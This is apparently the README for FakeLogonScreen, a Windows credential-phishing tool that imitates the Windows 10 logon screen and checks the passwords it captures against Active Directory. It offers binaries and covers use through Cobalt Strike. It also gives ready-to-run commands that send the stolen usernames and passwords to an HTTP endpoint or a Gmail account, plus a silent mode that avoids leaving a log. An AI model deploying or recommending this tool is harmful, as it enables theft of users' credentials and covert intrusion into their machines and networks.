# FakeLogonScreen
FakeLogonScreen is a utility to fake the Windows logon screen in order to obtain the user's password. The password entered is validated against the Active Directory or local machine to make sure it is correct and is then displayed to the console or saved to disk.

It can either be executed by simply running the .exe file, or using for example Cobalt Strike's `execute-assembly` command.

Binaries available from the [Releases](https://github.com/diegomardian/fakelogonscreen/releases) page.
- FakeLogonScreen.exe: Writes output to console which for example is compatible with Cobalt Strike
- FakeLogonScreenToFile.exe: Writes output to console and `%LOCALAPPDATA%\Microsoft\user.db`

Folders:
- / (root): Built against .NET Framework 4.5 which is installed by default in Windows 8, 8.1 and 10
- DOTNET35: Built against .NET Framework 3.5 which is installed by default in Windows 7

# Features
- Primary display shows a Windows 10 login screen while additional screens turn black
- If custom background is configured by the user, shows that background instead of the default one
- Validates entered password before closing the screen
- Username and passwords entered are outputted to console or stored in a file
- Blocks many shortkeys to prevent circumventing the screen
- Minimizes all existing windows to avoid other windows staying on top
- Send results through either http, gmail, or to a file

# How To Use
FakeLogonScreen accepts these parameters:
| Option | Description |
| ------ | ---------- |
| `http [url]` | Sends results to url as a json post request with the results contianed in "results" |
| `gmail [email] [password]` | Sends a email to the specified email (Note: You must enable less apps accesss [here](https://www.google.com/settings/security/lesssecureapps) |
| `file [filepath]` | writes results to the file specified |
 FakeLogonScreen normally will make a log.txt file but if you append `silent` to the end it will not.
## Http
You can create your own server or you can use [DuckyServer](), a pre built server.
## Exmaple using DuckyServer
`FakeLogonScreen.exe http http://127.0.0.1//fake_login_screen silent`
## Gmail
To use Gmail make sure you go to [https://www.google.com/settings/security/lesssecureapps](https://www.google.com/settings/security/lesssecureapps) and enable "Allow less secure apps" for the account you will use.
## Example
`FakeLogonScreen.exe gmail testaccount@gmail.com testpassword silent`
## File
Just specify the file you would like FakeLogonScreen to write to.
## Example
`FakeLogonScreen.exe file C:\Users\test\`
